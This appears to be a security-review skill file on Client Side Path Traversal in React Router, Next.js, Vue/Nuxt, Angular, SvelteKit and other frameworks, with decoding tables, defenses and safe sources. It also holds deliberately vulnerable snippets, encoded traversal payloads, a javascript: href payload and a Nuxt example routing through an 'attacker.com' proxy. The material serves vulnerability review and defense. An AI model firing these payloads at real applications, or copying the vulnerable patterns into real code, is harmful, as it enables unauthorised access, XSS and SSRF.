---
name: client_side_path_traversal
description: Client Side Path Traversal (CSPT) and secondary-context path traversal across frontend frameworks (React Router, Next.js, Vue Router, Angular, SvelteKit, Nuxt, Ember, SolidStart), including second-order/native deep-link CSPT and WAF/encoding-level (depth) bypass analysis
---

# Client Side Path Traversal (CSPT)

Client Side Path Traversal occurs when a frontend router decodes a URL path/query/hash component and a developer interpolates that decoded value directly into a `fetch`-style request URL. The browser (or server-side enhanced fetch) then resolves the embedded `../` before issuing the request, redirecting the call to an unintended same-origin endpoint. CSPT bypasses frontend route guards and lets attackers control the destination of an authenticated API call. When chained with open redirect, file upload, or HTML-rendering sinks (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{@html}`, `{{{ }}}`, Solid `innerHTML`), it commonly escalates to CSRF, stored XSS, or SSRF / secondary-context path traversal in hybrid frameworks (Next.js route handlers, SvelteKit `+page.server.ts`/`+server.ts`, Nuxt `server/api/`, SolidStart `"use server"` functions).

## Where to Look

**Frontend SPA Routers**
- React Router, Vue Router, Angular Router, Ember Router, `@solidjs/router`

**Hybrid Server/Client Frameworks**
- Next.js (App Router + Pages Router), Nuxt (Vue + H3/Nitro), SvelteKit, SolidStart

**Param/Query Sources**
- Dynamic path segments: `/users/:userId`, `/files/*`, `[...slug]`, `[id]`
- Query params: `useSearchParams`, `route.query`, `queryParamMap`, `url.searchParams`
- Hash fragment: `window.location.hash`
- Stored payloads (Nuxt island `__NUXT__` payload — CVE-2025-59414)

**Source taxonomy** — like XSS, a CSPT source is any attacker-influenced value that reaches a path; it is NOT limited to the router. Audit all three classes:
- **Reflected**: `?id=…`, path segment, or hash read on page load (`page?id=XXX`, `page#id=XXX`). The most common (and usually 1-click) form.
- **DOM-based**: any value read from the DOM/browser state — `location.*`, `document.referrer`, `postMessage` event data, `localStorage`/`sessionStorage`, `name`, or values previously written into the page — then interpolated into a request path.
- **Stored**: a value persisted server-side (DB record, profile field, filename) that the frontend later reads and concatenates into a fetch path. Stored CSPT fires for any user who loads the poisoned view and is easily missed by passive scanners (use a canary token to surface it).

**Client Sinks**
- `fetch()`, `XMLHttpRequest`, `axios.*`, `useFetch`/`$fetch` (Nuxt), `useSWR`/`useQuery` URL templates, Angular `HttpClient.get/post/put`, Ember Data adapters (`urlForFindRecord`, `urlForQuery`), Solid `createResource`/`createAsync`, RTK Query, Apollo `link.uri` builders

**Server-Side / Secondary Sinks** (hybrid frameworks)
- Next.js Route Handlers (`app/api/.../route.ts`) — `await params` auto-decodes
- SvelteKit `+page.server.ts`, `+server.ts` — `params.*` decoded by `decode_params()`
- Nuxt `server/api/[...path].ts` — `getRouterParam(event, key, { decode: true })`
- SolidStart `"use server"` `query()`/`action()` args — passthrough of decoded client string

## Core Concept

The browser normalizes literal `../` in the **path** before the request leaves the address bar, but does NOT normalize `../` inside **query strings** or after framework decoding completes. CSPT exploits the gap where:

1. The attacker encodes traversal characters (`%2F`, `%2E%2E`, `%252F`, etc.) so the URL survives the browser's path normalization.
2. The frontend router's decoding pipeline turns those encoded characters back into a real `/` and `..` inside a param/query value.
3. The developer interpolates the decoded value into a `fetch` URL template.
4. `fetch()` is given a string like `/api/users/../../admin/profile`; the browser resolves the `../` immediately before issuing the request, hitting a different endpoint than the developer intended.

The "sink" is any HTTP request builder. The "source" is the framework decoding step. Whether a framework is exploitable depends on **whether it calls `decodeURIComponent` on the param before the developer's code sees it**.

## Source -> Sink Pattern

**Sources** (decoded — DANGEROUS unless explicitly noted)

| Framework | Param Source | Query Source | Hash Source | Decoded? |
|-----------|--------------|--------------|-------------|----------|
| React Router | `useParams()` | `useSearchParams()` | `useLocation().hash` | YES |
| Next.js (page / `useParams`) | `await params`, `useParams()` | `useSearchParams()`, `searchParams` | `useSearchParams` (hash via `window`) | Params: re-encoded; Query: YES |
| Next.js (route handler) | `await params` (route.ts) | `request.nextUrl.searchParams` | n/a | YES (auto-decoded — secondary PT risk) |
| Vue Router | `route.params.*` | `route.query.*` | `route.hash` | YES |
| Nuxt (client) | `useRoute().params.*` | `useRoute().query.*` | `route.hash` | YES (inherits Vue Router) |
| Nuxt (server) | `getRouterParam(event, k)` | `getQuery(event)` | n/a | Param: NO by default; Query: YES |
| Nuxt (server) | `getRouterParam(event, k, { decode: true })` | n/a | n/a | YES |
| Angular | `paramMap.get()`, `snapshot.paramMap.get()` | `queryParamMap.get()` | `Location.path()` | YES |
| SvelteKit | `params.*` (`+page.ts`, `+page.server.ts`, `+server.ts`) | `url.searchParams`, `$page.url.searchParams` | `$page.url.hash` | YES |
| Ember | `params.*` in `model()` hook (`:param`) | `params.*` in `model()` (declared `queryParams`) | `window.location.hash` | YES (`:param`); partial for `*wildcard` |
| SolidStart | `useParams()` | `useSearchParams()` | `useLocation().hash` | Param: NO; Query: YES |

**Sinks** (the request builders that consume the decoded value)

- `fetch(\`/api/users/${id}\`)`
- `axios.get(\`/api/...${userInput}\`)`
- Angular `this.http.get(url)`, `this.http.post(url, body)`
- Vue/Nuxt `useFetch(\`/api/...${id}\`)`, `$fetch(...)`
- SvelteKit load `fetch(\`/api/...${params.x}\`)` (client + enhanced server fetch)
- SolidStart `createResource(() => fetch(...))` and `query(... "use server")`
- Ember `fetch()` in `model()` hook; Ember Data `urlForFindRecord`, `urlForQuery`
- Next.js client component `fetch` to a same-origin route handler

## Vulnerability Patterns

### React Router

`useParams()` returns fully decoded values. `decodePath()` runs `decodeURIComponent` per-segment then re-encodes `/`, but `matchPath()` immediately undoes that with `value.replace(/%2F/g, "/")`. Net effect: `%2F` → `/`, `%2E%2E` → `..`, and even `%252F` round-trips to `/` via decode-then-replace.

**Double-encoding is CASE-SENSITIVE (test both hex cases).** That `matchPath` replace uses `/%2F/g` with **no `i` flag**, so only the uppercase form is rewritten: `%252F` → (decode) `%2F` → (replace) `/` → traversal works, while `%252f` → (decode) `%2f` → **not replaced** → no traversal. This case gap was *reintroduced* by the "fix" for an earlier double-encoding bug. Practical rule for React Router (and Remix, which shares the router): always try **both** `%252F` and `%252f` (and `%2F`/`%2f`) — a payload that fails lowercase may succeed uppercase. A code-review tell is any single-case `.replace(/%2F/g, …)` / `.replace("%2F", …)` without the `i` flag in router/path-normalization code.

```javascript
// VULN — path param interpolated into fetch
const { userId } = useParams();
useEffect(() => {
  fetch(`/api/users/${userId}/profile`).then(/* ... */);
}, [userId]);
// URL: /users/..%2F..%2Fadmin → userId = "../../admin"
// fetch issued: GET /api/admin/profile
```

```javascript
// VULN — splat / catch-all route is the most dangerous variant
// Route: <Route path="files/*" element={<Files />} />
const params = useParams();
const file = params["*"]; // captures across / boundaries
fetch(`/api/files/${file}`); // literal ../ works WITHOUT any encoding
```

```javascript
// VULN — query param into fetch then into dangerouslySetInnerHTML (CSPT -> XSS)
const [searchParams] = useSearchParams();
const widget = searchParams.get("widget");
fetch(`/api/widgets/${widget}`).then(r => r.text()).then(setHtml);
return <div dangerouslySetInnerHTML={{ __html: html }} />;
```

**SAFE source**: `useLocation().pathname` preserves `%2F` encoding.

### Next.js

Two encoding personas under the same `await params` API:

- **Page / layout / `useParams()`**: `getParamValue()` re-encodes `%2F` back to `%2F` after decoding. Values are SAFE for path params.
- **Route handlers** (`app/api/.../route.ts`): `await params` decodes via `getRouteMatcher()` → `match.split('/').map(decode)`. `%2F` becomes `/` and is split into separate array elements.

```typescript
// VULN — secondary context path traversal via route handler
// app/api/content/[...path]/route.ts
export async function GET(_req, { params }) {
  const { path } = await params;
  // path = ["docs", "..", "..", "internal", "credentials"]  (auto-decoded)
  const fullPath = path.join("/");  // "docs/../../internal/credentials"
  return fetch(`https://backend.internal/${fullPath}`);
}
```

```typescript
// VULN — query params on the client side (Next.js does NOT re-encode query)
"use client";
const sp = useSearchParams();
const widget = sp.get("widget"); // "../../attachments/malicious"
fetch(`/api/widgets/${widget}`);
```

**SAFE**: page-level `await params` and `useParams()` (re-encoded).
**DANGEROUS**: route handler `await params`, `useSearchParams()` on the client.

**Blind detection via 500-error oracle**: server-side secondary-context PT is blind (no response body reaches the attacker), but the server-rendered route or route handler typically returns **HTTP 500 on an invalid resolved path and 200 when the path reconstructs to a valid one**. Probe a server-decoded path param with `%2F..%2F` payloads: a `500` for a climbing payload that lands nowhere vs. a `200` for a self-cancelling reconstruction (`value/../value`) confirms the param is decoded and concatenated into a server-side path/fetch. The same status-differential oracle applies to other SSR frameworks that bubble path errors (SvelteKit `+page.server.ts`/`+server.ts`, Nuxt `server/api`, Astro API routes).

### Vue Router / Nuxt (client)

`route.params.*` runs through `decodeParams()` → `decodeURIComponent`. `%2F` → `/`. Same for `route.query.*` (via `parseQuery()`). `+` is preserved as a literal character (unlike standard `URLSearchParams`).

```javascript
// VULN — Vue Router param to useFetch / $fetch
const route = useRoute();
const { data } = useFetch(`/api/products/${route.params.productId}`);
// /product/..%2f..%2fadmin → productId = "../../admin"
// fetch URL: /api/products/../../admin → /api/admin
```

```javascript
// VULN — multi-param route doubles attack surface (Nuxt)
// /shop/..%2F..%2Fadmin/..%2Fusers
useFetch(`/api/shop/${route.params.category}/products/${route.params.productId}`);
// resolves to /api/admin/users
```

```html
<!-- CRITICAL — CSPT to XSS via v-html (Vue/Nuxt) -->
<script setup>
const widget = useRoute().query.widget;            // decoded
const { data: html } = await useFetch(`/api/widgets/${widget}`);
</script>
<template><div v-html="html" /></template>
```

**Nuxt server (H3)**: `getRouterParam(event, 'id')` does NOT decode by default. `getRouterParam(event, 'id', { decode: true })` and explicit `decodeURIComponent()` on the raw value DO decode → SSRF / secondary PT.

**Nuxt-specific stored CSPT** (CVE-2025-59414): the `revive-payload.client.js` plugin fetches `/__nuxt_island/${key}.json` using a key from the `window.__NUXT__` payload. If an attacker can poison the payload (cache poisoning, stored injection, MITM on initial HTML), the key can traverse to any same-origin endpoint:

```javascript
// nuxt/dist/app/plugins/revive-payload.client.js (excerpt)
nuxtApp.payload.data[key] ||= $fetch(`/__nuxt_island/${key}.json`, { ... });
// key = "../../api/proxy/attacker.com?x="
//   → $fetch("/__nuxt_island/../../api/proxy/attacker.com?x=.json")
//   → /api/proxy/attacker.com?x=.json  (the .json is absorbed by the query string)
```

**SAFE sources**: `route.path`, `route.fullPath` (preserve `%2F`); `getRouterParam(event, k)` without `{ decode: true }`.

### Angular

`paramMap.get()` and `queryParamMap.get()` both run `decodeURIComponent`. `SEGMENT_RE = /^[^\/()?;#]+/` allows `%2F` to stay inside one segment during matching, then `decode()` decodes after. Result: route matches AND param is decoded — Angular is more permissive for `%2F` than React/Vue.

```typescript
// VULN — paramMap into HttpClient (the canonical Angular CSPT)
ngOnInit() {
  this.route.paramMap.pipe(
    switchMap(p => {
      const userId = p.get('userId');           // "../../admin"
      return this.http.get(`/api/users/${userId}/profile`);
    })
  ).subscribe(d => this.user = d);
}
```

```typescript
// CRITICAL — CSPT -> XSS via [innerHTML] + bypassSecurityTrustHtml()
const html = this.sanitizer.bypassSecurityTrustHtml(apiResponse);  // disables sanitizer
// template: <div [innerHTML]="html"></div>
```

```typescript
// VULN — open redirect via router.navigate with decoded query value
const next = this.route.snapshot.queryParamMap.get('next'); // decoded
this.router.navigate([next]);
```

`router.navigate()` re-encodes its inputs (`%` → `%25`), so it is NOT a path-traversal sink, but it IS an open-redirect sink when fed an attacker-controlled decoded value.

**SAFE source**: `router.url` preserves `%2F`.

### SvelteKit

Two-stage pipeline: `decode_pathname()` (uses `decodeURI`, which preserves `/`) → route regex match → `decode_params()` (`decodeURIComponent`). Final params have real `/`. `decode_pathname()` splits on `%25` first, which makes `%252F` resolve to literal `%2F` (NOT `/`) — SvelteKit blocks double-encoding bypasses.

```typescript
// VULN — universal load function (runs on client nav AND SSR)
// src/routes/users/[userId]/+page.ts
export async function load({ params, fetch }) {
  const res = await fetch(`/api/users/${params.userId}/profile`);
  // /users/..%2Fadmin%2Fsecrets → params.userId = "../admin/secrets"
  // Resolved: GET /api/admin/secrets/profile
  return { user: await res.json() };
}
```

```typescript
// CRITICAL — server-only load with internal network access
// src/routes/data/[dataId]/+page.server.ts
export const load = async ({ params }) => {
  const dataId = params.dataId;  // decoded, traversal payload arrives here
  const doc = await fetch(`http://internal-service.local/data/${dataId}`);
  return { data: await doc.json() };
};
// The fetch does NOT pass through hooks.server.ts — auth middleware bypassed.
```

```svelte
<!-- CRITICAL — CSPT to XSS via {@html} -->
<script>
  import { page } from '$app/stores';
  const widget = $page.url.searchParams.get('widget'); // decoded
  let html = '';
  $: fetch(`/api/widgets/${widget}`).then(r => r.text()).then(t => html = t);
</script>
{@html html}
```

**SAFE** (best framework-level defense): param matchers reject the route entirely before `load()` runs.

```typescript
// src/params/id.ts
export function match(param: string): boolean {
  return /^[a-zA-Z0-9-_]+$/.test(param);
}
// Usage: src/routes/user/[id=id]/+page.svelte
// "../../admin" never matches → 404 before any load executes.
```

### Ember

`route-recognizer` runs `normalizePath()` (per-segment `decodeURIComponent` + re-encode `%` and `/`) then `findHandler()` which calls `decodeURIComponent` AGAIN for `:param` segments (skipped for `*wildcard`). Net: `:param` returns fully decoded value with real `/`. Double-encoding is blocked because `normalizePath` re-encodes `%`.

```javascript
// VULN — params in model hook
// app/routes/user.js
export default class UserRoute extends Route {
  model(params) {
    return fetch(`/api/users/${params.user_id}`).then(r => r.json());
    // /user/..%2f..%2fadmin → params.user_id = "../../admin"
  }
}
```

```javascript
// VULN — Ember Data adapter without encoding (indirect CSPT)
// app/adapters/user.js
export default class UserAdapter extends RESTAdapter {
  urlForFindRecord(id, modelName) {
    return `/api/${modelName}s/${id}`; // No encodeURIComponent on `id`
  }
}
// this.store.findRecord('user', params.user_id)
// where params.user_id = "../../admin" → fetches /api/admin
```

```handlebars
{{! CRITICAL — CSPT -> XSS via triple curlies / htmlSafe() }}
{{{this.model.content}}}
```

`*wildcard` segments capture `/` as part of the regex `(.+)` and skip the final `decodeURIComponent`. Literal `../` works without encoding; `%2F` stays encoded.

**SAFE source**: `window.location.pathname` (raw browser value, bypasses route-recognizer).

### SolidStart

`@solidjs/router`'s `createMatcher()` stores raw path segments WITHOUT calling `decodeURIComponent`. `useParams()` for single-segment dynamic params is the only framework-decoded source that is safe by default. `useSearchParams()` uses standard `URLSearchParams` and is fully decoded.

```tsx
// SAFE for path params
const params = useParams();
fetch(`/api/users/${params.userId}`); // %2F stays %2F → server receives literal %2F
```

```tsx
// VULN — search params are the primary CSPT vector in SolidStart
const [searchParams] = useSearchParams();
const [stats] = createResource(
  () => searchParams.source,
  async (source) => {
    const r = await fetch(`/api/stats?source=${source}`);
    return r.json();
  }
);
// /dashboard/stats?source=../../uploads/malicious → fetch fires with traversal
```

```tsx
// VULN — server function ("use server") passes client string through unchanged
const getData = query(async (dataId: string) => {
  "use server";
  const r = await fetch(`http://internal-service.local/data/${dataId}`);
  return r.json();
}, "getData");
// If dataId came from useSearchParams() (decoded) or a catch-all route,
// "../../admin" lands on the server unchanged → SSRF.
```

```tsx
// CRITICAL — Solid's first-class innerHTML JSX prop is an XSS sink
<div innerHTML={apiResponse()} />   // compiles to element.innerHTML = value
```

**SAFE sources**: `useParams()` (single segment) and `useLocation().pathname`. Both preserve percent-encoding.

### Remix

Remix is built on React Router, so the client-side decoding behaviour is **identical to React Router** — `useParams()` returns fully decoded values (`%2F` → `/`, `%2E%2E` → `..`, double-encoding via decode-plus-replace). The interesting wrinkles are server-side: `loader({ params })` and `action({ params })` receive params from the Remix router which also runs them through `decodeURIComponent`, so the same decoded values flow into server `fetch`/database/internal-API calls — a secondary-context PT path identical in shape to SvelteKit's `+page.server.ts`.

```typescript
// VULN — client-side CSPT
// app/routes/users.$userId.tsx
export default function UserPage() {
  const { userId } = useParams();                 // "../../admin"
  const { data } = useFetcher();
  useEffect(() => { fetcher.load(`/api/users/${userId}/profile`); }, [userId]);
}
```

```typescript
// CRITICAL — secondary-context PT in a server loader/action
// app/routes/users.$userId.tsx
export const loader = async ({ params }: LoaderFunctionArgs) => {
  const userId = params.userId;                   // decoded; e.g., "../../admin"
  const res = await fetch(`http://internal-service.local/users/${userId}`);
  return json(await res.json());
};

// app/routes/api.content.$.tsx  — splat route (`$` catch-all)
export const loader = async ({ params }: LoaderFunctionArgs) => {
  const path = params["*"];                       // decoded; literal `../` works
  return fetch(`http://backend/${path}`);          // SSRF / secondary PT
};
```

**Resource routes** (`app/routes/api.*.ts` that export `loader`/`action` without a default component) are the highest-risk Remix surface — they often proxy to internal APIs and inherit hooks/auth less consistently than page routes.

**SAFE sources**: like React Router, only `useLocation().pathname` preserves `%2F` encoding; server-side, treat `params.*` as decoded user input.

### Astro

Astro pages use file-based routing with `[param]` and `[...slug]` syntax. `Astro.params` is populated by Astro's router; values are URL-decoded once via `decodeURIComponent`, so behaviour is **similar to SvelteKit's `+page.ts`** — `%2F` decodes to `/` and lands in the param value.

```astro
---
// VULN — Astro page or endpoint reading decoded params
// src/pages/users/[userId].astro  (or src/pages/api/users/[userId].ts)
const { userId } = Astro.params;                  // decoded
const res = await fetch(`http://internal/users/${userId}`);
const data = await res.json();
---
```

Astro **API routes** (`src/pages/api/**/*.ts`) run on the server and execute with full network access, so any traversal in `Astro.params` reaching an internal `fetch` is a secondary-context PT, analogous to Next.js route handlers and SvelteKit `+server.ts`.

**SAFE sources**: there is no preserved-encoding alternative in Astro's official API; recommend validating param shape against a regex or matcher before interpolation, equivalent to SvelteKit's param matchers.

### TanStack Router / TanStack Start

TanStack Router supports both decoded params and validated search-params via `parseSearch`/`stringifySearch`. By default `useParams()` and `useSearch()` return decoded values; the safer pattern is to declare a Zod/Valibot schema in `validateSearch` / `parseParams`, which rejects values not matching the schema before the route renders.

```typescript
// VULN — default useParams without validation
const { userId } = Route.useParams();             // decoded
fetch(`/api/users/${userId}`);

// SAFE — typed param validation at route definition
export const Route = createFileRoute('/users/$userId')({
  parseParams: ({ userId }) => ({
    userId: z.string().regex(/^[\w-]+$/).parse(userId),
  }),
});
```

### Qwik City

`useLocation()` and route params expose decoded values; route `loader$()` / `action$()` run on the server. Conceptually identical to SvelteKit's load functions — pair decoded params with `fetch` for client-side CSPT or with server-side internal fetches for secondary PT.

### HTMX / Alpine.js (non-SPA frameworks)

Apps using HTMX (`hx-get="${url}"`) or Alpine.js (`x-data` / `:href="..."`) often interpolate values from the URL or DOM attributes into the request URL. The decoding is whatever the browser does to the attribute value (which mirrors the original URL), so encoded `%2F`/`%2E%2E` in attribute templates can be a CSPT primitive when the attribute interpolation runs on the client.

```html
<!-- VULN — HTMX hx-get built from a search param read by Alpine -->
<div x-data="{ id: new URL(location).searchParams.get('id') }">
  <button :hx-get="`/api/items/${id}`" hx-trigger="click">Load</button>
</div>
<!-- ?id=..%2F..%2Fadmin → hx-get hits /api/admin -->
```

## Decoding Cheat Sheet — Path Params

| Framework | Source | %2F → /? | %2E%2E → ..? | %252F → /? | Splat/catch-all literal `../`? |
|-----------|--------|:--------:|:------------:|:----------:|:-----------------------------:|
| React Router | `useParams()` | YES | YES | YES — **uppercase `%252F` only**; `%252f` is NOT (case-sensitive `replace`, no `i` flag) | YES (browser normalizes path → traversal stays in param value) |
| Next.js page / `useParams` | re-encoded | NO | YES | NO | NO (re-encoded) |
| Next.js route handler | decoded | YES | YES | NO | YES |
| Vue Router | `route.params.*` | YES | YES | NO | depends on route shape |
| Nuxt client | `useRoute().params.*` | YES | YES | NO | as Vue Router |
| Nuxt server | `getRouterParam` | NO | NO | NO | NO |
| Nuxt server `{ decode: true }` | decoded | YES | YES | NO | YES |
| Angular | `paramMap.get()` | YES | YES | NO | n/a (`**` requires manual parse) |
| SvelteKit | `params.*` | YES | YES | NO (`%25`-split blocks) | catch-all returns string with real `/` |
| Ember (`:param`) | `params.*` | YES | YES | NO (`normalizePath` re-encodes `%`) | n/a |
| Ember (`*wildcard`) | `params.*` | NO (skips final decode) | partial | NO | YES (literal `../`) |
| SolidStart | `useParams()` | NO | NO | NO | NO (encoded), `[...path]` joins real `/` |

## Decoding Cheat Sheet — Query Params

**Every framework decodes query parameters.** Query strings have NO segment boundary, so the entire value (including literal `../`) lands in one decoded string with no encoding tricks needed.

| Framework | Source | Decoded | Notes |
|-----------|--------|:-------:|-------|
| React Router | `useSearchParams()` | YES | standard `URLSearchParams` |
| Next.js | `useSearchParams()` / `searchParams` | YES | standard `URLSearchParams` |
| Vue Router | `route.query.*` | YES | `parseQuery()`; `+` stays literal |
| Nuxt (client) | `useRoute().query.*` | YES | inherits Vue Router |
| Nuxt (server) | `getQuery(event)` | YES | `ufo` library decodes |
| Angular | `queryParamMap.get()` | YES | `decodeQuery()` → `decodeURIComponent` |
| SvelteKit | `url.searchParams`, `$page.url.searchParams` | YES | standard `URLSearchParams` |
| Ember | `params.*` (declared `queryParams`) | YES | browser-decoded |
| SolidStart | `useSearchParams()` | YES | standard `URLSearchParams` |

## XSS Sinks — The Escalation Function

When a CSPT-controlled `fetch` response is rendered as raw HTML, CSPT escalates to (often stored) XSS.

| Framework | Sink | Compiles To |
|-----------|------|-------------|
| React / Next.js | `dangerouslySetInnerHTML={{ __html: val }}` | `element.innerHTML = val` |
| Vue / Nuxt | `v-html="val"` | `element.innerHTML = val` |
| Angular | `[innerHTML]="val"` + `DomSanitizer.bypassSecurityTrustHtml(val)` | `element.innerHTML = val` (sanitizer bypassed) |
| SvelteKit | `{@html val}` | `element.innerHTML = val` |
| Ember | `{{{val}}}`, `htmlSafe(val)` | `insertAdjacentHTML('beforeend', val)` |
| SolidStart | `<div innerHTML={val} />` | `element.innerHTML = val` |

### URL-attribute scheme injection — XSS WITHOUT an innerHTML sink

A CSPT-controlled response field bound into an **`href`/`src`/`xlink:href`/`formaction`** attribute is an XSS sink when its value is a `javascript:` (or `data:`/`vbscript:`) URL — framework HTML **auto-escaping does NOT neutralize this**, because the value is a valid attribute string, not injected markup. So `<a href={resp.externalUrl}>` with `externalUrl = "javascript:alert(origin)"` executes on click even though there is no `dangerouslySetInnerHTML`/`v-html`/`{@html}`. This is the common "controlled JSON → `href`" escalation seen in real CSPT chains (e.g. a profile/skill object whose `externalUrl`/`website`/`avatar` field feeds an anchor or image).

| Framework | URL-attribute binding | `javascript:` href executes? |
|-----------|-----------------------|:----------------------------:|
| React / Next.js | `<a href={val}>`, `<img src={val}>` | YES (React only logs a dev warning; it renders the URL) |
| Vue / Nuxt | `:href="val"`, `:src="val"` | YES (Vue does not sanitize URL attributes) |
| SvelteKit | `<a href={val}>` | YES |
| Ember | `<a href={{val}}>` | YES |
| SolidStart | `<a href={val}>` | YES |
| Angular | `[href]="val"`, `[src]="val"` | NO for `[href]` (Angular strips `javascript:` → `unsafe:`); YES if `bypassSecurityTrustUrl()`/`bypassSecurityTrustResourceUrl()` is used |

Often **requires user interaction** (a click) and so is typically **High** rather than Critical on its own, but it is a genuine XSS — do not dismiss a CSPT-controlled response just because the render path is "only" attribute interpolation. Treat any `href`/`src` bound from a CSPT-reachable response as a sink unless the framework sanitizes the scheme (Angular `[href]`) or the code validates the scheme against an `https?:`/relative allowlist.

## CSPT → Code Execution via Dynamic Module / Script Load

Unlike a `fetch` sink (which only *retrieves* a response), a dynamic module/script sink **resolves `../` and then executes** the loaded code in a same-origin context. A decoded param interpolated into `import()`, `importScripts()`, `new Worker()`/`new SharedWorker()`, or `navigator.serviceWorker.register()` lets an attacker traverse out of the intended directory to **any same-origin `.js` URL** — and that code runs with the page's full DOM/session/origin authority. This is a **direct CSPT → XSS/RCE-in-page** primitive that does NOT require an HTML render sink.

```javascript
// VULN — decoded route param chooses a module path
const { widgetName } = useParams();              // "../../uploads/evil"
import(`./widgets/${widgetName}.js`);            // loads & EXECUTES /uploads/evil.js
```

It becomes exploitable whenever the attacker can make *some* same-origin URL return JavaScript: a file-upload/attachment endpoint that serves user content same-origin, a JSONP/callback endpoint, a stored-content route, or even a CSPT-reachable API that reflects attacker text with a JS-compatible content type. `import()` requires a JS MIME type; `importScripts`/`Worker` are more permissive. Treat any module/script-load sink fed a decoded value as **Critical** when a same-origin attacker-controllable script is reachable, **High** otherwise (it still breaks the module-path allowlist / can load unintended internal modules).

**SAFE**: resolve from a fixed allowlist map (`const mods = { chart: () => import('./widgets/chart.js') }; mods[name]?.()`), or validate against `^[\w-]+$` before interpolation. Never interpolate a decoded value into a module/script URL.

## Safe Sources — What Won't Betray You

| Framework | Safe Source | Why |
|-----------|-------------|-----|
| React Router | `useLocation().pathname` | preserves `%2F` |
| Next.js | `useParams()` / page `await params` | `getParamValue()` re-encodes `%2F` |
| Vue Router | `route.path`, `route.fullPath` | preserve `%2F` |
| Nuxt (client) | `route.path`, `route.fullPath` | inherits Vue Router |
| Nuxt (server) | `getRouterParam(event, k)` (no `{ decode: true }`) | radix3 returns raw |
| Angular | `router.url` | preserves `%2F` |
| SvelteKit | param matchers `[id=id]` | rejects non-matching values before `load()` runs |
| Ember | `window.location.pathname` | bypasses route-recognizer |
| SolidStart | `useParams()` (single segment), `useLocation().pathname` | router never calls `decodeURIComponent` |

## Server-Side / Secondary Context PT Sinks

When a decoded client value is forwarded to a server handler that interpolates it into an internal `fetch`, CSPT becomes SSRF / secondary-context path traversal — often more impactful because the server has access to internal networks the client does not.

| Framework | Server Sink | Decoded? | Risk |
|-----------|-------------|:--------:|------|
| Next.js | route handler `await params` → `fetch()` | YES (auto) | SSRF to internal services |
| Nuxt | `getRouterParam(event, k, { decode: true })` → `$fetch()` | YES (opt-in) | SSRF to internal services |
| SvelteKit | `+page.server.ts` / `+server.ts` `params.*` → `fetch()` | YES | SSRF, BYPASSES `hooks.server.ts` (auth middleware ineffective) |
| SolidStart | `query(... "use server")` args → `fetch()` | passthrough of client string | SSRF if client value already decoded |
| Remix | `loader({ params })` / `action({ params })` / resource routes → `fetch()` | YES | SSRF / secondary PT; resource routes (`api.*.ts`) most exposed |
| Astro | `Astro.params` in `src/pages/api/**/*.ts` → `fetch()` | YES | SSRF / secondary PT |
| Qwik City | `routeLoader$` / `routeAction$` params → `fetch()` | YES | SSRF / secondary PT |
| Nuxt | `revive-payload.client.js` island key → `$fetch` | stored | Stored CSPT (CVE-2025-59414) |

### Receiver-side decoding in server frameworks

Independent of which SPA framework the client uses, the *receiving* server framework also decodes path params. Treat any `req.params.*` / `request.params.*` / `ctx.params.*` interpolated into an internal `fetch` or filesystem path as a secondary-context PT sink.

| Server framework | Path-param API | Decoded? | Notes |
|------------------|----------------|:--------:|-------|
| Express (`/users/:id`) | `req.params.id` | YES — per-segment `decodeURIComponent` | `path-to-regexp` segment match prevents `%2F` from creating sub-segments but the final value is decoded |
| Fastify (`/users/:id`) | `request.params.id` | YES — `decodeURIComponent` per segment | Same shape as Express |
| Koa / `@koa/router` | `ctx.params.id` | YES | Same shape |
| Hapi (`/users/{id}`) | `request.params.id` | YES | `request.params['id*']` (multi-segment) also decoded; literal `../` works |
| NestJS (`@Param('id')`) | controller-method arg | YES (inherits Express/Fastify under the hood) | `@Param('id', new ParseIntPipe())`-style pipes are an effective allowlist defense |
| ASP.NET Core (`{id}`) | `[FromRoute] string id` | YES (`UrlDecoder`) | `[Route("api/files/{*path}")]` catch-all keeps literal `/` characters |
| Spring (`@PathVariable`) | method arg | YES | `@PathVariable("path") String path` decodes `%2F` post-routing |
| Flask (`<string:id>`) / FastAPI (`{id}`) | view-function arg | YES | Path converters (`<int:id>`, `<uuid:id>`) reject traversal at routing time |
| Rails (`params[:id]`) | controller method | YES | `constraints: { id: /\d+/ }` rejects traversal at routing time |

The strongest receiver-side defense in every framework is a **route-level constraint** (NestJS pipes, Spring `@PathVariable` + `@Pattern`, Express middleware regex, Rails `constraints`, Flask/FastAPI typed path converters, SvelteKit param matchers): the route fails to match and the handler never runs.

## Additional Client-Side Sinks

`fetch` is the canonical sink, but every HTTP/URL-aware client API resolves `../` the same way once it sees a path. Treat any of the following as a CSPT sink when fed a decoded param interpolated into a URL template:

```javascript
// All resolve `../` in the path portion before sending
fetch(`/api/x/${userId}`);
axios.get(`/api/x/${userId}`);
new XMLHttpRequest().open('GET', `/api/x/${userId}`);
new WebSocket(`/ws/${userId}`);                  // ws-relative URLs resolve `../` the same way
new EventSource(`/sse/${userId}`);
navigator.sendBeacon(`/beacon/${userId}`, body);
caches.match(`/api/x/${userId}`);                // service-worker cache key — pollutes the cache lookup
self.fetch(`/api/x/${userId}`);                  // inside a ServiceWorker
self.registration.showNotification('', { data: { url: `/api/x/${userId}` }});

// Dynamic module / script loaders — resolve `../` AND then EXECUTE the result (CSPT -> code execution)
import(`./widgets/${userId}.js`);                // dynamic ESM import — runs the loaded module in page context
importScripts(`/sw-plugins/${userId}.js`);       // inside a Worker/ServiceWorker — runs the script
new Worker(`/workers/${userId}.js`, { type: 'module' });
new SharedWorker(`/workers/${userId}.js`);
navigator.serviceWorker.register(`/sw/${userId}.js`);   // traversed scope/script can hijack the origin

// Library wrappers — same underlying primitive
useSWR(`/api/x/${userId}`, fetcher);
useQuery({ queryKey: ['x', userId], queryFn: () => fetch(`/api/x/${userId}`) });
apolloClient.query({ query: GET_X, variables: { id: userId }, uri: `/graphql/${userId}` });
```

### `new URL(path, base)` — sometimes a defense, sometimes a sink

`new URL` is a context-sensitive construct that often differs from string concatenation:

```javascript
// Effectively the same as string concat — resolves `../`
const u = new URL(`/api/x/${userId}`, location.origin);
fetch(u);

// SAFER — encodes path segment, but ONLY if the segment is used in pathname,
// not concatenated into the path string template
const u = new URL(location.origin);
u.pathname = `/api/x/${encodeURIComponent(userId)}`;
fetch(u);

// SAFE — URLSearchParams encodes query values
const u = new URL('/api/x', location.origin);
u.searchParams.set('id', userId);
fetch(u);                                        // ?id=..%2F..%2Fadmin (encoded, no traversal)
```

The pattern to look for: `URLSearchParams.set` / `URL.pathname = encodeURIComponent(...)` is generally safe; raw template-literal interpolation into `new URL(template, base)` is NOT.

